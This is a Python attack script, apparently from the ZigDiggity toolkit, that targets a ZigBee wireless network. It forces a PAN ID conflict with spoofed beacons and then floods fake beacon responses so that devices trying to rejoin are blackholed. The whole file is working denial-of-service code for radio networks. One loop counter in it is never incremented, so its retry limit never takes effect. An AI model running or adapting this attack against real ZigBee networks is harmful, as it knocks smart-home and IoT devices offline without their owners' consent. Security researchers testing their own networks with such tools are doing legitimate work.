#!/usr/bin/python

from zigdiggity.interface.main import start_and_get_targets
from zigdiggity.datastore import database_session
from zigdiggity.datastore.networks import Network
import zigdiggity.utils.packets as packets
from zigdiggity.interface.colors import *
from threading import Event
import threading
import signal
import time
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

DEBUG = 1

def find_pan_using_epan(radio, epan, delay):
    
    packet = packets.beacon_request()
    radio.send(packet)
    send_time = time.time()

    target_pan = None
    while(time.time() < send_time + delay):
        test_packet = radio.recv()
        if not test_packet == None:
            if ZigBeeBeacon in test_packet:
                if test_packet[ZigBeeBeacon].extended_pan_id ==long(epan):
                    target_pan = test_packet[Dot15d4Beacon].src_panid
                    break

    return target_pan


def listen_for_packets(listener, useless):
    
    Color.pl("{+} Listener thread started")
    while not stop_threads.isSet():
        packet = listener.recv()
        if not packet is None:
            if Dot15d4Cmd in packet:
                if packet[Dot15d4Cmd].cmd_id == 7: # Beacon request
                    if not packet[Dot15d4FCS].seqnum == 0:
                        threading.send_beacon = 30  

def send_beacons(sender, target_epan):

    beacons_sent = 0
    fake_pan = 0x0539
    sequence_number=216

    Color.pl("{+} Sender thread started")
    while not stop_threads.isSet():
        if (beacons_sent > 0):
            Color.oneliner("{.} Fake beacon responses sent: %s " % beacons_sent)
        if threading.send_beacon > 0: 
            # Send a beacon
            packet = packets.beacon_response(fake_pan, extended_panid=long(target_epan), seq_num=sequence_number)
            sequence_number = (sequence_number + 1) % 254
            sender.send(packet)
            threading.send_beacon -= 1
            beacons_sent += 1

def handle_interrupt(signal, frame):
    stop_threads.set()
    Color.pl("")
    Color.pl("{.} Receiver average time: %s ms" % (listener.avg_recv() * 1000))
    Color.pl("{.} Sender average time: %s ms" % (sender.avg_send() * 1000))
    time.sleep(1)
    exit(1)

if __name__ == '__main__':
    init_info = start_and_get_targets(database_session)

    sender = init_info['sender']
    listener = init_info['listener']
    target_type = init_info['target']['target_type']

    if target_type == 'channel':        
        Color.pl("{!} Blackholing rejoin beacons can only be done against a network.")
        Color.pl("{!} Please re-run and choose {G}Network{W}.")
        exit(1)
    elif target_type == 'network':
        network_target = init_info['target']['network']
        channel = network_target.channel
        target_epan = network_target.extended_pan_id
        if target_epan is None:
            
            # need to find the epan to perform the network attack
            target_pan = network_target.pan_id
            if target_pan is None:
                Color.pl("{!} Cannot target a network without a PAN or extended PAN.")
                exit(1)
            
            network = database_session.query(Network).filter_by(pan_id=target_pan).first()
            if not network is None:
                target_epan = network.extended_pan_id
                network_key = network.nwk_key
            else:
                Color.pl("{!} Cannot find the extended PAN associated with the target.")
                exit(1)

        else:
            target_pan = network_target.pan_id
        
        target_addr = None

    elif target_type == 'device':
        Color.pl("{!} Blackholing rejoin beacons can only be done against a network.")
        Color.pl("{!} Please re-run and choose {G}Network{W}.")
        exit(1)
    
    listener.set_channel(channel)
    sender.set_channel(channel)

    Color.pl("{.} Locating the target's current PAN ID")

    # Find the pan id of the target
    for i in range(3):
        target_pan = find_pan_using_epan(listener, target_epan, 5) # waits 5 seconds
        if not target_pan is None:
            break
        time.sleep(0.5)

    Color.pl("{+} Found target PAN ID: %s" % ("%x"%target_pan))
    Color.pl("{.} Attempting to force the target PAN to change.")

    # Push a pan id conflict
    pan_changed = False
    counter = 1
    while not pan_changed:
        beacon = packets.beacon_response(target_pan, seq_num=(i+1))
        sender.send(beacon)
        time.sleep(0.05)
        beacon_req = packets.beacon_request()
        sender.send(beacon_req)
        packet = listener.recv()
        if not packet is None:
            if ZigBeeBeacon in packet and packets.get_extended_pan(packet) == long(target_epan):
                if not packets.get_pan_id(packet) == target_pan:
                    pan_changed = True
        if counter > 100:
            Color.pl("{!} Device PAN not changing, please try again.")
            exit(1)

    Color.pl("{+} PAN has changed")
    # let everything settle down
    time.sleep(1)

    start_time = time.time()
    threading.send_beacon = 0

    global stop_threads 
    stop_threads = Event()

    listen_thread = threading.Thread(target=listen_for_packets, args=(listener, 1))
    send_thread = threading.Thread(target=send_beacons, args=(sender, target_epan))

    listen_thread.daemon = True
    send_thread.daemon = True

    send_thread.start()
    listen_thread.start()

    signal.signal(signal.SIGINT, handle_interrupt)

    while not stop_threads.isSet():
        try:
            send_thread.join(timeout=1)
        except KeyboardInterrupt:
            stop_threads.set() 

